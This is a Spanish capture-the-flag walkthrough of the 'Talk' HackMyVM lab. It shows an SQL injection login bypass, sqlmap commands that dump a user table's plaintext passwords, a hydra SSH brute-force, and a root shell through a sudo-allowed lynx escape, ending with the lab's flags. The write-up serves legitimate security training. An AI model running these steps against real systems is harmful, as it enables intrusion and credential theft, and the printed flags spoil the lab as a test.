---
icon: flag
---

# Talk HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 03:36 EDT
Nmap scan report for 192.168.5.36
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e3:fc:1b:74:e5:e3:c9:ef:6d:ac:df:b1:1e:47:83:ad (RSA)
|   256 10:bd:60:33:a0:d1:a4:7d:de:c8:29:0a:c4:7d:b1:aa (ECDSA)
|_  256 4b:fc:30:a8:12:69:e7:b2:ce:ad:99:f1:66:12:cd:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: chatME
MAC Address: 08:00:27:11:A4:6F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

Veremos que hay un puerto `80` en el que se aloja una pagina web, vamos a ver que contiene dicha pagina web, si entramos veremos un `login` por lo que vamos a probar credenciales por defecto, pero veremos que no funciona, por lo que vamos a probar a realizar un `SQLi`.

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Veremos que funciona:

<figure><img src="../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

Nos llevara a un panel con una especie de chat para conversar, pero no veremos nada mas interesante, como se pude realizar un `SQLi` super simple vamos a probar algo mas avanzado con la herramienta de `sqlmap`.

Primero vamos abrir `BurpSuite`, meter las credenciales en el `login` como `admin:admin` y darle a `login` para capturar la peticion con `BurpSuite` viendose algo asi:

```
POST /login.php HTTP/1.1
Host: 192.168.5.36
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://192.168.5.36
Connection: keep-alive
Referer: http://192.168.5.36/index.php
Cookie: PHPSESSID=89d38fndl31inet0kf8l8clqgk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```

## sqlmap

Ahora esto lo vamos a guardarlo en un archivo llamado `request.txt`, una vez echo esto vamos a utilizar `sqlmap` de esta forma.

```shell
sqlmap -r request.txt --dbs --batch
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:48:12 /2025-06-10/

[03:48:12] [INFO] parsing HTTP request from 'request.txt'
[03:48:12] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
[03:48:12] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:48:12] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] Y
[03:48:12] [WARNING] please consider usage of tamper scripts (option '--tamper')
[03:48:12] [INFO] testing if the target URL content is stable
[03:48:13] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[03:48:13] [INFO] searching for dynamic content
[03:48:13] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
[03:48:13] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only' 
[03:48:13] [INFO] testing if POST parameter 'username' is dynamic
[03:48:13] [INFO] POST parameter 'username' appears to be dynamic
[03:48:13] [INFO] testing for SQL injection on POST parameter 'username'
[03:48:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:48:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:48:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:48:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:48:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:48:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:48:13] [INFO] testing 'Generic inline queries'
[03:48:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:48:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:48:13] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:48:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:48:23] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:48:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:48:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://192.168.5.36/home.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[03:48:23] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))SCeI) AND 'HyyM'='HyyM&password=admin
---
[03:48:39] [INFO] the back-end DBMS is MySQL
[03:48:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:48:44] [INFO] fetching database names
[03:48:44] [INFO] fetching number of databases
[03:48:44] [INFO] retrieved: 4
[03:48:49] [INFO] retrieved: 
[03:48:54] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[03:49:52] [INFO] retrieved: chat
[03:50:04] [INFO] retrieved: mysql
[03:50:21] [INFO] retrieved: performance_schema
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema

[03:51:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.36'

[*] ending @ 03:51:17 /2025-06-10/
```

Veremos que ha funcionado, por lo que vamos a ver que contiene la `DDBB` llamada `chat` de esta forma:

```shell
sqlmap -r request.txt --dbs --batch -D chat --threads 10 --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:52:39 /2025-06-10/

[03:52:39] [INFO] parsing HTTP request from 'request.txt'
[03:52:39] [INFO] resuming back-end DBMS 'mysql' 
[03:52:39] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
[03:52:39] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))SCeI) AND 'HyyM'='HyyM&password=admin
---
[03:52:39] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:52:39] [INFO] fetching database names
[03:52:39] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[03:52:39] [INFO] resumed: 4
[03:52:39] [INFO] resumed: information_schema
[03:52:39] [INFO] resumed: chat
[03:52:39] [INFO] resumed: mysql
[03:52:39] [INFO] resumed: performance_schema
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema

[03:52:39] [INFO] fetching tables for database: 'chat'
[03:52:39] [INFO] fetching number of tables for database 'chat'
[03:52:39] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                              
[03:52:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[03:52:54] [INFO] adjusting time delay to 1 second due to good response times
3
[03:52:54] [INFO] retrieved: user
[03:53:07] [INFO] retrieved: chat
[03:53:19] [INFO] retrieved: chat_room
Database: chat
[3 tables]
+-----------+
| user      |
| chat      |
| chat_room |
+-----------+

[03:53:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.36'

[*] ending @ 03:53:45 /2025-06-10/
```

Ahora vamos a ver que contiene la tabla llamada `user` que es la mas interesante.

```shell
sqlmap -r request.txt --dbs --batch -D chat -T user --threads 10 --dump
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:54:55 /2025-06-10/

[03:54:55] [INFO] parsing HTTP request from 'request.txt'
[03:54:55] [INFO] resuming back-end DBMS 'mysql' 
[03:54:55] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
[03:54:55] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))SCeI) AND 'HyyM'='HyyM&password=admin
---
[03:54:55] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:54:55] [INFO] fetching database names
[03:54:55] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[03:54:55] [INFO] resumed: 4
[03:54:55] [INFO] resumed: information_schema
[03:54:55] [INFO] resumed: chat
[03:54:55] [INFO] resumed: mysql
[03:54:55] [INFO] resumed: performance_schema
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema

[03:54:55] [INFO] fetching columns for table 'user' in database 'chat'
[03:54:55] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                              
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[03:55:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[03:55:11] [INFO] adjusting time delay to 1 second due to good response times
6
[03:55:11] [INFO] retrieved: userid
[03:55:29] [INFO] retrieved: username
[03:55:52] [INFO] retrieved: password
[03:56:20] [INFO] retrieved: your_name
[03:56:52] [INFO] retrieved: email
[03:57:05] [INFO] retrieved: phone
[03:57:26] [INFO] fetching entries for table 'user' in database 'chat'
[03:57:26] [INFO] fetching number of entries for table 'user' in database 'chat'
[03:57:26] [INFO] retrieved: 5
[03:57:28] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                     
david@david.com
[03:58:16] [INFO] retrieved: adrianthebest
[03:58:54] [INFO] retrieved: 11
[03:58:58] [INFO] retrieved: 5
[03:59:01] [INFO] retrieved: david
[03:59:16] [INFO] retrieved: david
[03:59:30] [INFO] retrieved: jerry@jerry.com
[04:00:20] [INFO] retrieved: thatsmynonapass
[04:01:10] [INFO] retrieved: 111
[04:01:16] [INFO] retrieved: 4
[04:01:20] [INFO] retrieved: jerry
[04:01:36] [INFO] retrieved: jerry
[04:01:51] [INFO] retrieved: nona@nona.com
[04:02:39] [INFO] retrieved: myfriendtom
[04:03:15] [INFO] retrieved: 1111
[04:03:24] [INFO] retrieved: 2
[04:03:27] [INFO] retrieved: nona
[04:03:41] [INFO] retrieved: nona
[04:03:56] [INFO] retrieved: pao@yahoo.com
[04:04:43] [INFO] retrieved: pao
[04:04:55] [INFO] retrieved: 09123123123
[04:05:27] [INFO] retrieved: 1
[04:05:29] [INFO] retrieved: pao
[04:05:41] [INFO] retrieved: PaoPao
[04:06:03] [INFO] retrieved: tina@tina.com
[04:06:46] [INFO] retrieved: davidwhatpass
[04:07:27] [INFO] retrieved: 11111
[04:07:38] [INFO] retrieved: 3
[04:07:41] [INFO] retrieved: tina
[04:07:53] [INFO] retrieved: tina
Database: chat
Table: user
[5 entries]
+--------+-----------------+-------------+-----------------+----------+-----------+
| userid | email           | phone       | password        | username | your_name |
+--------+-----------------+-------------+-----------------+----------+-----------+
| 5      | david@david.com | 11          | adrianthebest   | david    | david     |
| 4      | jerry@jerry.com | 111         | thatsmynonapass | jerry    | jerry     |
| 2      | nona@nona.com   | 1111        | myfriendtom     | nona     | nona      |
| 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
| 3      | tina@tina.com   | 11111       | davidwhatpass   | tina     | tina      |
+--------+-----------------+-------------+-----------------+----------+-----------+

[04:08:06] [INFO] table 'chat.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.5.36/dump/chat/user.csv'
[04:08:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.36'

[*] ending @ 04:08:06 /2025-06-10/
```

Veremos que tenemos informacion bastante interesante, vamos a realizar un diccionario de usuario y contraseñas para probarlos en `hydra` por `SSH`.

> users.txt

```
david
jerry
nona
pao
tina
```

> pass.txt

```
adrianthebest
thatsmynonapass
myfriendtom
pao
davidwhatpass
```

Ahora vamos a tirar un `hydra` de esta forma.

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-10 04:21:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 25 tasks per 1 server, overall 25 tasks, 25 login tries (l:5/p:5), ~1 try per task
[DATA] attacking ssh://192.168.5.36:22/
[22][ssh] host: 192.168.5.36   login: nona   password: thatsmynonapass
[22][ssh] host: 192.168.5.36   login: david   password: davidwhatpass
[22][ssh] host: 192.168.5.36   login: jerry   password: myfriendtom
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-10 04:21:11
```

### SSH

Veremos que hay `3` credenciales validas, por lo que vamos a probar con el usuario `nona` a ver que nos encontramos.

```shell
ssh nona@<IP>
```

Metemos como contraseña `thatsmynonapass` y veremos que estamos dentro, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
wordsarelies
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for nona on talk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nona may run the following commands on talk:
    (ALL : ALL) NOPASSWD: /usr/bin/lynx
```

Veremos que podemos ejecutar el binario `lynx` como el usuario `root` por lo que haremos lo siguiente.

```shell
sudo lynx
# SHIFT+! (Ejecutamos eso de ahi)
```

Info:

```
Spawning your default shell.  Use 'exit' to return to Lynx.

root@talk:/home/nona# whoami
root
```

Con esto veremos que ya seremos `root` por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
talktomeroot
```
